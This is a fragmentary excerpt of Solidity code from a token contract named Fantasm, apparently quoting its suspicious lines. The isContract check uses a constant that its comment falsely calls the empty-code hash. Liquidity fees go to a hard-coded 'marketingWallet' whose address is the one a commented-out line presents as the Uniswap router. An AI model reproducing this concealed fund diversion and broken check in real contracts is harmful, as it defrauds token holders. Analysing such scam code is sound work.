...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;
...
contract Fantasm is Context, IERC20, Ownable {
    ...
    function excludeFromReward(address account) public onlyOwner() {
        // require(account != 0xd3fa3275369A468915bA8f15bc6627779370427A, 'We can not exclude Uniswap router.');
    ...
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        address marketingWallet = 0xd3fa3275369A468915bA8f15bc6627779370427A;
